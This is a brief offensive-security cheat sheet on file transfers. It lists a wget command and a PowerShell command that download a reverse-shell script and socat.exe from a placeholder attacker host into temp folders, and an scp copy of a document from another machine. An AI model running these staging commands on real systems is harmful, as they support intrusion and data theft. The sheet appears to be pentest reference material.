---
description: Cheat sheet to upload or download shell/files etc
---

# File Transfers

### Download 

#### Wget

```text
wget <LOCAL-IP>/reverse.sh -O /tmp/reverse.sh
```

#### Powershell

```text
Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe
```

SCP

```text
scp ubuntu@192.168.1.30:/home/ubuntu/documents.txt notes.txt
```



